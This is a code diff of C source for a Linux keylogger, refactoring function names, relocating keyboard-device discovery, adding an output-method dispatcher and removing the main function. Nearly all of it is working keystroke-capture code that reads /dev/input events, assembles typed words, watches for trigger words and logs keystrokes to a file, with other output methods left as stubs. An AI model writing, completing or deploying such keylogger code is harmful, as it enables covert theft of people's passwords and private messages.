@@ -1,33 +1,6 @@
 #include "../includes/keyLogger.h"
 
-char *findKeyboardDevice()
-{
-  FILE *fp;
-  char path[BUFFER_SIZE];
-  char *device = NULL;
-
-  fp = popen("ls /dev/input/by-path/*kbd* | head -n 1", "r");
-  if (fp == NULL)
-  {
-    DEBUG_MODE == 1 ? printf("\n") : 0;
-    return NULL;
-  }
-
-  if (fgets(path, sizeof(path), fp) != NULL)
-  {
-    size_t len = strlen(path);
-    if (len > 0 && path[len - 1] == '\n')
-    {
-      path[len - 1] = '\0';
-    }
-    device = strdup(path);
-  }
-
-  pclose(fp);
-  return device;
-}
-
-char *printKey(KeyLogger *keyLogger)
+char *KeyMapper(KeyLogger *keyLogger)
 {
   char *key = NULL;
 
@@ -188,7 +161,34 @@ char *printKey(KeyLogger *keyLogger)
   return key;
 }
 
-void writeToFile(KeyLogger *keyLogger)
+char *FindKeyboardDevice()
+{
+  FILE *fp;
+  char path[BUFFER_SIZE];
+  char *device = NULL;
+
+  fp = popen("ls /dev/input/by-path/*kbd* | head -n 1", "r");
+  if (fp == NULL)
+  {
+    DEBUG_MODE == 1 ? printf("\n") : 0;
+    return NULL;
+  }
+
+  if (fgets(path, sizeof(path), fp) != NULL)
+  {
+    size_t len = strlen(path);
+    if (len > 0 && path[len - 1] == '\n')
+    {
+      path[len - 1] = '\0';
+    }
+    device = strdup(path);
+  }
+
+  pclose(fp);
+  return device;
+}
+
+void WriteToFile(KeyLogger *keyLogger)
 {
   if (keyLogger->ev.type == EV_KEY && keyLogger->ev.value == 1)
   {
@@ -216,7 +216,7 @@ void writeToFile(KeyLogger *keyLogger)
       break;
     default:
     {
-      char *text = printKey(keyLogger);
+      char *text = KeyMapper(keyLogger);
       fprintf(file, "%s", text);
       break;
     }
@@ -226,7 +226,17 @@ void writeToFile(KeyLogger *keyLogger)
   }
 }
 
-KeyLogger *createKeyLogger()
+void OutPut(KeyLogger *keyLogger, short unsigned int method) {
+  if (method == 0) {
+    printf("Method not implemented\n");
+  } else if (method == 1) {
+    WriteToFile(keyLogger);
+  } else if (method == 2) {
+    printf("Method not implemented\n");
+  }
+}
+
+KeyLogger *CreateKeyLogger()
 {
   KeyLogger *keyLoger = (KeyLogger *)malloc(sizeof(KeyLogger));
   if (keyLoger == NULL)
@@ -244,7 +254,7 @@ KeyLogger *createKeyLogger()
   return keyLoger;
 }
 
-void mountWord(KeyLogger *keyLogger)
+void MountWord(KeyLogger *keyLogger)
 {
   if (keyLogger->ev.code == KEY_SPACE || keyLogger->ev.code == KEY_TAB)
   {
@@ -253,7 +263,7 @@ void mountWord(KeyLogger *keyLogger)
     return;
   }
 
-  char *text = printKey(keyLogger);
+  char *text = KeyMapper(keyLogger);
   if (text == NULL)
   {
     return;
@@ -270,7 +280,7 @@ void mountWord(KeyLogger *keyLogger)
 
   if (keyLogger->ev.code == KEY_ENTER)
   {
-    analyzeWord(keyLogger);
+    AnalyzeWord(keyLogger);
     free(keyLogger->currentWord);
     keyLogger->currentWord = NULL;
     return;
@@ -304,7 +314,7 @@ void mountWord(KeyLogger *keyLogger)
   }
 }
 
-void analyzeWord(KeyLogger *keyLogger)
+void AnalyzeWord(KeyLogger *keyLogger)
 {
   if (keyLogger->currentWord == NULL)
   {
@@ -328,9 +338,9 @@ void analyzeWord(KeyLogger *keyLogger)
   }
 }
 
-void startKeyLogger(KeyLogger *keyLogger)
+void StartKeyLogger(KeyLogger *keyLogger)
 {
-  char *device = findKeyboardDevice();
+  char *device = FindKeyboardDevice();
   if (device == NULL)
   {
     DEBUG_MODE == 1 ? fprintf(stderr, "Not found keyboard\n") : 0;
@@ -369,12 +379,12 @@ void startKeyLogger(KeyLogger *keyLogger)
     if (ev.type == EV_KEY && ev.value == 1)
     {
       keyLogger->ev = ev;
-      mountWord(keyLogger);
-      analyzeWord(keyLogger);
+      MountWord(keyLogger);
+      AnalyzeWord(keyLogger);
 
       if (keyLogger->listen == 1)
       {
-        writeToFile(keyLogger);
+        OutPut(keyLogger, OUT_PUT_METHOD);
       }
     }
   }
@@ -383,20 +393,7 @@ void startKeyLogger(KeyLogger *keyLogger)
   free(device);
 }
 
-void destroyKeyLogger(KeyLogger *keyLogger)
+void DestroyKeyLogger(KeyLogger *keyLogger)
 {
   free(keyLogger);
-}
-
-int main()
-{
-  KeyLogger *keyLogger = createKeyLogger();
-
-  if (keyLogger == NULL)
-  {
-    return 1;
-  }
-
-  startKeyLogger(keyLogger);
-  return 0;
 }
